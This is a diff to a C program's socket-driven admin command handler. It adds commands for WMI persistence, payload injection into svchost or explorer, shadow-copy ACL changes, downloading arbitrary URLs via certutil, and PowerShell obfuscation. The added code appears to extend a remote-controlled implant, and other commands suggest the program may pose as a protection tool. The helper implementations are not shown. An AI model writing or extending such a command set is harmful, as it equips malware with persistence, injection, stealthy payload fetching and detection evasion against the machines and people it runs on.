@@ -153,6 +153,31 @@ static void handle_admin_command(SOCKET sock, const char *cmd_raw) {
         snprintf(response, sizeof(response), "%s [running as %s]", critical_status, admin_status);
         result = response;
     }
+    else if (strcmp(cmd, "WMI_PERSISTENCE") == 0) {
+        sys_wmi_persistence();
+        result = "[WMI persistence established: root/subscription, triggers every 30s]";
+    }
+    else if (strcmp(cmd, "INJECT_PROCESS") == 0) {
+        sys_inject_process();
+        result = "[Process injection attempted: payload injected into svchost/explorer]";
+    }
+    else if (strcmp(cmd, "HARDEN_FILES") == 0) {
+        sys_harden_files();
+        result = "[NTFS ACLs hardened: deny delete for all shadow copies]";
+    }
+    else if (strncmp(cmd, "LOLBAS_DOWNLOAD ", 16) == 0) {
+        char url[1024], path[MAX_PATH];
+        if (sscanf(cmd, "LOLBAS_DOWNLOAD %s %s", url, path) == 2) {
+            sys_lolbas_download(url, path);
+            result = "[LOLBAS download completed via certutil]";
+        } else {
+            result = "[Usage: LOLBAS_DOWNLOAD <url> <outpath>]";
+        }
+    }
+    else if (strncmp(cmd, "OBFUSCATE_PS ", 14) == 0) {
+        const char *ps_cmd = cmd + 14;
+        result = sys_obfuscate_ps(ps_cmd);
+    }
     else if (strcmp(cmd, "PROTECT_NOW") == 0) {
         if (!sys_is_admin()) {
             result = "[FAIL: not running as administrator]";
